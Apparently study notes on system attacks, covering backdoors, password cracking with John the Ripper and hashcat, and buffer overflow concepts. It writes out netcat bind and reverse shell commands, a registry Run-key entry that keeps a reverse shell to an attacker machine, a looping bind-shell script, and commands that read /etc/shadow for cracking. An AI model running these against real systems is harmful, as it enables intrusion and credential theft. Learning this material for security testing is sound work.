# System Attacks

## Backdoor

Backdoors have two components, server and client:

* _Server_ runs on the victim machine listening on the network in order to accept connections.
* _Client_ runs on the attacker machine.
* `Netbus` or `SubSeven` are very famous.
* If the backdoor server sits behind a firewall, the easiest way to archive a connection is using a **Connect-back Backdoor** or **Reverse Backdoor**.
* A firewall cannot tell the difference between a user surfing the web and a backdoor connecting back to the attacker's machine.

### Create stable connection to a remote host

```bash
# => Listener
ncat -l -v -p 5555 -e /bin/bash
# => Client
ncat localhost 5555

## Reverse connection
# => Attacker/Listener
ncat -l -p 5555 -v
# => Victim / Client
ncat -e /bin/bash remoteIP remotePort

# bash interactive for friendly prompt
bash -i
```

```bash
# Persist execution in windows
> regedit.exe
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CurrentVersion\Run

# Add string value
Name: ncact
Value: yourpath\ncat attackerMachine Port -e cmd.exe
```

```bash
# Persistent connection script
# By default netcat does not have a persistent connection.
# You will need to run it in a while loop if you want to connect to it more than once.
# Otherwise it will close the program after the first connection:
# https://defcon.org/images/defcon-22/dc-22-presentations/Nemus/DEFCON-22-Lance-Buttars-Nemus-Intro-to-backdooring-OS.pdf

#!/bin/bash
while [ 1 ]; do
  echo | ncat -l -v -p 445 -e /bin/bash
done
```

## Password Attacks

Normally stored in an encrypted form, preventing a malicious local user from getting to know user's passwords, using a _one-way encryption algorithm_, using a cryptographic hashing function. There are three main strategies:

### Brute force attacks

> This method is only used when other attack vectors fail.

You try them all by _generating_ and testing all the possible valid passwords. Given enough time, a brute force attack is always successful.

* Long passwords made by upper and lower case letters, numbers and symbols can take days or even years to crack
* _John The Ripper_: can mount both brute force and dictionary-based attacks against a password database (see: `john --list=formats`)
  * Fast because of the high use of parallelization, crack strategies
  * `/etc/passwd`: contains info about user accounts
  * `/etc/shadow`: contains info about the actual password hashes
  * `john` needs the username and the password hashes to be in the same file, therefore we need to use the `unshadow` utility that comes with _John The Ripper_
  * `john -incremental -users:<users list> <file to crack>`
  * `john -incremental -users:victim crackme`
  * To display the passwords recovered by `john`, use: `john --show <file>`

### Dictionary attacks

* Common passwords
* Faster than pure brute force attacks
* Poorly chosen or default passwords are more exposed to dictionary cracking
* `john -wordlist=<custom wordlist file> <file to crack>`
* Install password dictionaries: `apt-get install seclists`
  * You'll find them in `/usr/share/seclists/Passwords`
* **Mangling words**
  * Variations on dictionary words
  * `john -wordlist=<custom wordlist file> <file to crack> -rules <file to crack>`

### Rainbow Tables

* Offer a tradeoff between the processing time needed to calculate the hash of a password and the storage space needed to mount an attack.
* A rainbow table contains links between the results of a run of one hashing function and another.
* Rainbow tables are BIG in file size, but reduces a cracking session from days to seconds.
* Great choice to crack simple and complex short passwords.
* `Ophcrack` rainbow cracking for Windows authentication passwords (can run on Linux too).

## John the Ripper

```bash
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/john/password.lst hashes.txt
cat /root/.john/john.pot
```

## Hashcat

```bash
# -m hash-type
# -a various attack mode
# -b benchmark
# -D specify the device
# -O optimize performance

> hashcat -b

# Wordlist attack
> hashcat -m 0 -a 0 -D2 example.hash example.dict
# -m 0 md5 type of hash
# -a 0 simple dictionary attack

# Rules
# Mutate dictionary words by setting different rules
custom.rule:

l
u
c
r
$1
$2
[
]
^1
^a
^!$!

# also hashcat comes with builtin rules

# Mask Attack
# 5 letter passwords = 5 masks
> hascat -m 0 -a 3 example.hash ?l?l?l?l
```

## Buffer Overflow Attacks

A BoF attack can lead to:

* An app or OS crash (DoS).
* Privilege escalation.
* Remote code execution.
* Security features bypass.

A buffer is an area in the RAM reserved for temporary data storage:

* User input, parts of a video file, server banners received by a client application. etc.
* Buffers have a finite size, therefore: if an app developer does not enforce a buffer limit, an attacker could find a way to write data beyond those limits and write there arbitrary code

### Stack

* A stack is a data structure used to store data.
* Two operation for LIFO stacks: `pop` & `push`.
* Space on the stack can be allocated from app's code.
* An overflow happens when an attacker overwrites on a reserved space, so overwriting a function return address means getting control over the app.
* If an attacker manages to overflow a local variable from the app, the attacker would be able to overwrite the _Base Pointer_ and then get a _Return Address_.
* If the attacker overwrites the _Return Address_ with the right value, they are able to control the execution flow of the program.
* This technique can be exploited by writing custom tools and applications or by using hacking tools as Metasploit.

Being able to write a buffer overflow exploit requires a deep understanding of assembly programming, how applications and OS works and some exotic programming skills.
